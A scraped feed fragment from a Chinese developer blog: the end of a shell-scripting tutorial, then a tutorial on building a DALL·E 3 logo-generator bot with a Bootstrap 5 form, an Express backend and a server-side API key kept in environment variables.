<li><strong>特殊字符</strong>：处理包含空格的文件名/路径时，用双引号包裹（如<code>[ -f "$file" ]</code>）；</li>
<li><strong>日志输出</strong>：重要操作添加日志（如<code>echo "[$(date)] 备份失败" &gt;&gt; /tmp/backup.log</code>），方便排查问题；</li>
<li><strong>测试先行</strong>：新脚本先在测试环境运行，用<code>bash -x 脚本名</code>调试（显示执行过程）。</li>
</ol>
<h2 data-id="heading-37">总结</h2>
<p>Shell脚本的核心是“把复杂操作简单化、重复操作自动化”——变量存储数据，条件判断实现逻辑分支，循环处理批量任务，函数封装复用代码。学习时无需死记语法，重点是“多写多练”：先从简单脚本（如批量创建文件、检查服务状态）入手，再逐步实现复杂功能（如自动化备份、批量部署）。</p>
<p>掌握这些基础语法后，可结合运维场景扩展（如结合crontab定时执行脚本、结合SSH批量管理服务器），真正实现“一键运维”，大幅提升工作效率。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【AI-7 全栈-2 /Lesson16(2025-11-01)】构建一个基于 AIGC 的 Logo 生成 Bot：从前端到后端的完整技术指南 🎨]]></title>    <link>https://juejin.cn/post/7576978338754756658</link>    <guid>https://juejin.cn/post/7576978338754756658</guid>    <pubDate>2025-11-27T06:28:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754756658" data-draft-id="7576929700842455049" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【AI-7 全栈-2 /Lesson16(2025-11-01)】构建一个基于 AIGC 的 Logo 生成 Bot：从前端到后端的完整技术指南 🎨"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2025-11-27T06:28:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【AI-7 全栈-2 /Lesson16(2025-11-01)】构建一个基于 AIGC 的 Logo 生成 Bot：从前端到后端的完整技术指南 🎨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:28:32.000Z" title="Thu Nov 27 2025 06:28:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>🎨在当今这个人工智能与前端开发深度融合的时代，构建一个能根据用户输入自动生成 Logo 的智能 Bot 已不再是遥不可及的梦想。本文<strong>逐字逐句、毫无删减地展开详细讲解</strong>，并补充所有相关的技术细节，涵盖前端布局、表单设计、无障碍访问、API 调用、LLM 集成、安全实践等多个维度。准备好了吗？Let’s go! 🚀</p>
<hr/>
<h2 data-id="heading-0">🧩 1. 项目目标：Logo 生成 Bot</h2>
<p>根据 <code>index.html</code> 中的信息：</p>
<pre><code class="hljs language-html" lang="html">Document
Bot名称： Bot描述： 生成图标
</code></pre>
<p>我们可以明确这个项目的 <strong>核心功能</strong> 是：</p>
<blockquote>
<p>用户输入一段文本（如“科技公司 logo”），系统调用 AI 模型（如 DALL·E 3），自动生成对应的 Logo 图像。</p>
</blockquote>
<p>这本质上是一个 <strong>AIGC（AI Generated Content）应用</strong>，结合了前端交互与后端大模型 API。</p>
<hr/>
<h2 data-id="heading-1">🖼️ 2. 选择合适的 AI 模型：DALL·E 3</h2>
<p><code>readme.md</code> 中明确指出：</p>
<blockquote>
<p>coze logo 生成选择合适的模型 dalle-e-3</p>
</blockquote>
<h3 data-id="heading-2">✅ 为什么选 DALL·E 3？</h3>
<ul>
<li><strong>高分辨率图像生成</strong>：支持 1024×1024、1792×1024 等多种尺寸。</li>
<li><strong>文本理解能力强</strong>：能精准解析复杂 prompt，如“极简风格的蓝色科技感 logo，包含电路图案”。</li>
<li><strong>OpenAI 官方支持</strong>：通过 <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2Fguides%2Fimages" target="_blank" title="https://platform.openai.com/docs/guides/images" ref="nofollow noopener noreferrer">OpenAI Images API</a> 可直接调用。</li>
</ul>
<h3 data-id="heading-3">🔧 调用方式（补充）</h3>
<p>使用 OpenAI 的 Node.js SDK：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"openai"</span>;

<span class="hljs-keyword">const</span> openai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span> });

<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">"dall-e-3"</span>,
  <span class="hljs-attr">prompt</span>: input, <span class="hljs-comment">// ← 这就是 {{input}}</span>
  <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">size</span>: <span class="hljs-string">"1024x1024"</span>
});

<span class="hljs-keyword">const</span> imageUrl = response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">url</span>;
</code></pre>
<blockquote>
<p>💡 注意：<code>{{input}}</code> 是模板语法，通常在前端或服务端模板引擎中被替换为用户实际输入。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">🌐 3. 前端页面结构：Bootstrap + HTML5 表单</h2>
<p><code>readme.md</code> 提到了大量前端技术要点，我们逐一展开。</p>
<h3 data-id="heading-5">📦 使用 Bootstrap 样式库</h3>
<blockquote>
<p>CSS: <a href="https://link.juejin.cn?target=https%3A%2F%2Fv2.bootcss.com%2Fbase-css.html" target="_blank" title="https://v2.bootcss.com/base-css.html" ref="nofollow noopener noreferrer">v2.bootcss.com/base-css.ht…</a></p>
</blockquote>
<p>这是 <strong>Bootstrap v2 的中文 CDN</strong>（现已被 v5 取代，但原理相通）。我们采用现代实践，使用 <strong>Bootstrap 5</strong> 构建响应式布局。</p>
<h4 data-id="heading-6">🏗️ 页面容器布局</h4>
<blockquote>
<p><code>.container PC端页面的layout 中间宽度，.row 左右margin:auto;</code></p>
</blockquote>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row justify-content-center"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-6"</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- 表单放这里 --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li><code>.container</code>：固定宽度（如 1140px 在大屏），居中。</li>
<li><code>.row</code> + <code>justify-content-center</code>：实现水平居中（比手动写 <code>margin: auto</code> 更语义化）。</li>
</ul>
<hr/>
<h3 data-id="heading-7">📝 HTML5 表单最佳实践</h3>
<p><code>readme.md</code> 强调了以下关键点：</p>
<h4 data-id="heading-8">✅ 必填字段：<code>required</code> 属性</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">required</span>&gt;</span>
</code></pre>
<ul>
<li>浏览器会自动阻止提交空值，并提示用户。</li>
</ul>
<h4 data-id="heading-9">💬 占位符提示：<code>placeholder</code></h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入 Logo 描述，例如：极简风咖啡店 logo"</span>&gt;</span>
</code></pre>
<ul>
<li>提升用户体验，尤其对“小白用户”友好 👶。</li>
</ul>
<h4 data-id="heading-10">♿ 无障碍访问（Accessibility）：<code>&lt;label for="id"&gt;</code></h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"prompt"</span>&gt;</span>Logo 描述<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">required</span>&gt;</span>
</code></pre>
<ul>
<li><strong>为什么重要？</strong>
<ul>
<li>屏幕阅读器（如 JAWS、VoiceOver）能正确朗读标签。</li>
<li>点击 label 可聚焦 input，提升移动端体验。</li>
</ul>
</li>
<li>大厂（如 Google、Apple、阿里）强制要求无障碍合规（WCAG 标准）✅。</li>
</ul>
<h4 data-id="heading-11">📂 表单分组：<code>.form-group</code></h4>
<blockquote>
<p><code>.form-group 表单组，margin-bottom: 15px;</code></p>
</blockquote>
<p>虽然 Bootstrap 5 已弃用 <code>.form-group</code>，但其思想仍适用：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>Logo 描述<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">required</span> 
         <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"例如：蓝色科技感 AI 公司 logo"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li><code>mb-3</code> = margin-bottom: 1rem（≈16px），视觉上分隔表单项。</li>
</ul>
<hr/>
<h3 data-id="heading-12">🚫 阻止默认提交行为：<code>event.preventDefault()</code></h3>
<blockquote>
<p>点击按钮，表单的提交 form 默认提交到 action 为空就是当前页面<br/>
event.preventDefault() 阻止表单的默认提交</p>
</blockquote>
<h4 data-id="heading-13">❌ 默认行为的问题</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>生成 Logo<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<ul>
<li>若 <code>action=""</code> 或未设置，表单会 <strong>刷新当前页面</strong>，丢失状态！</li>
</ul>
<h4 data-id="heading-14">✅ 正确做法：JavaScript 拦截</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'form'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-keyword">async</span> (e) =&gt; {
  e.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// ← 关键！阻止页面跳转/刷新</span>

  <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'prompt'</span>).<span class="hljs-property">value</span>;
  <span class="hljs-comment">// 调用 API 获取 logo...</span>
});
</code></pre>
<hr/>
<h2 data-id="heading-15">⚙️ 4. 后端 API 集成：Node.js + OpenAI</h2>
<p><code>readme.md</code> 提到：</p>
<blockquote>
<p>node openai completion API<br/>
输入：prompt<br/>
输出：completion<br/>
llm 发起的api接口调用 前端界面 api LLM<br/>
POST 请求<br/>
apikey 加密</p>
</blockquote>
<h3 data-id="heading-16">🔁 完整数据流</h3>
<pre><code class="hljs language-css" lang="css">前端 (<span class="hljs-selector-tag">HTML</span>/JS) 
  → POST /generate-logo { prompt: <span class="hljs-string">"..."</span> } 
  → Node<span class="hljs-selector-class">.js</span> 服务端 
  → 调用 OpenAI Images API (DALL·E <span class="hljs-number">3</span>) 
  → 返回图片 URL 
  → 前端显示 &lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>="..."&gt;
</code></pre>
<h3 data-id="heading-17">🔐 API Key 安全实践</h3>
<blockquote>
<p><strong>绝对不要</strong> 在前端暴露 <code>OPENAI_API_KEY</code>！</p>
</blockquote>
<p>✅ 正确做法：</p>
<ul>
<li>将 key 存在 <strong>服务端环境变量</strong> 中（如 <code>.env</code> 文件）。</li>
<li>前端只与自己的后端通信，后端再调用 OpenAI。</li>
</ul>
<pre><code class="hljs language-env" lang="env"># .env
OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// server.js (Express 示例)</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/generate-logo'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { prompt } = req.<span class="hljs-property">body</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">"dall-e-3"</span>,
      <span class="hljs-attr">prompt</span>: prompt,
      <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">size</span>: <span class="hljs-string">"1024x1024"</span>
    });
    res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">url</span>: response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">url</span> });
  } <span class="hljs-keyword">catch</span> (error) {
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> });
  }
});
</code></pre>
<hr/>
<h2 data-id="heading-18">🧪 5. 开发与测试工具：Apifox</h2>
<blockquote>
<p>apifox</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.apifox.cn%2F" target="_blank" title="https://www.apifox.cn/" ref="nofollow noopener noreferrer">Apifox</a> 是一款国产 API 协作平台，集 Postman（调试）、Swagger（文档）、Mock（模拟）于一体。</p>
<h3 data-id="heading-19">🛠️ 如何用于本项目？</h3>
<ol>
<li>定义 <code>/generate-logo</code> 接口文档。</li>
<li>模拟 OpenAI 返回（开发阶段无需真实调用）。</li>
<li>前端直接对接 Mock 数据，加速联调。</li>
</ol>
<hr/>
<h2 data-id="heading-20">🧠 6. AIGC 与 LLM 的本质理解</h2>
<blockquote>
<p>AIGC LLM 的本质</p>
</blockquote>
<ul>
<li><strong>LLM（Large Language Model）</strong>：如 GPT-4，擅长文本生成与理解。</li>
<li><strong>AIGC（AI Generated Content）</strong>：泛指 AI 生成的内容，包括文本（LLM）、图像（DALL·E、Midjourney）、音频、视频等。</li>
<li><strong>本项目属于 “Text-to-Image” AIGC 应用</strong>，由 LLM（理解 prompt）驱动图像模型（生成 logo）。</li>
</ul>
<blockquote>
<p>💡 虽然 DALL·E 3 不是传统 LLM，但它内部集成了强大的语言理解模块，可视为 LLM 与扩散模型的结合体。</p>
</blockquote>
<hr/>
<h2 data-id="heading-21">🧱 7. 完整前端代码示例（整合所有要点）</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Logo 生成 Bot<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-5"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row justify-content-center"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-6"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center mb-4"</span>&gt;</span>🎨 AI Logo 生成器<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"logoForm"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-3"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"prompt"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>请输入 Logo 描述<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
              <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> 
              <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> 
              <span class="hljs-attr">id</span>=<span class="hljs-string">"prompt"</span> 
              <span class="hljs-attr">name</span>=<span class="hljs-string">"prompt"</span> 
              <span class="hljs-attr">required</span> 
              <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"例如：极简风格的绿色环保公司 logo，含树叶元素"</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary w-100"</span>&gt;</span>生成 Logo<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-4 text-center"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'logoForm'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-keyword">async</span> (e) =&gt; {
      e.<span class="hljs-title function_">preventDefault</span>();
      <span class="hljs-keyword">const</span> prompt = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'prompt'</span>).<span class="hljs-property">value</span>;
      <span class="hljs-keyword">const</span> resultDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'result'</span>);
      
      resultDiv.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">'&lt;div class="spinner-border" role="status"&gt;&lt;span class="visually-hidden"&gt;加载中...&lt;/span&gt;&lt;/div&gt;'</span>;
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/generate-logo'</span>, {
          <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
          <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
          <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ prompt })
        });
        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
        <span class="hljs-keyword">if</span> (data.<span class="hljs-property">url</span>) {
          resultDiv.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`&lt;img src="<span class="hljs-subst">${data.url}</span>" class="img-fluid rounded mt-3" alt="生成的 Logo"&gt;`</span>;
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(data.<span class="hljs-property">error</span> || <span class="hljs-string">'未知错误'</span>);
        }
      } <span class="hljs-keyword">catch</span> (err) {
        resultDiv.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`&lt;div class="alert alert-danger"&gt;<span class="hljs-subst">${err.message}</span>&lt;/div&gt;`</span>;
      }
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<hr/>
<h2 data-id="heading-22">✅ 总结：技术栈全景图</h2>








































<table><thead><tr><th>模块</th><th>技术</th><th>说明</th></tr></thead><tbody><tr><td><strong>前端</strong></td><td>HTML5 + Bootstrap 5</td><td>响应式布局、无障碍表单</td></tr><tr><td><strong>交互</strong></td><td>JavaScript (Fetch API)</td><td>拦截表单、调用后端</td></tr><tr><td><strong>后端</strong></td><td>Node.js + Express</td><td>接收请求、调用 OpenAI</td></tr><tr><td><strong>AI 模型</strong></td><td>DALL·E 3 (via OpenAI API)</td><td>文本生成 Logo 图像</td></tr><tr><td><strong>安全</strong></td><td>环境变量 (.env)</td><td>保护 API Key</td></tr><tr><td><strong>开发工具</strong></td><td>Apifox</td><td>API 设计与测试</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-23">🌈 结语</h2>
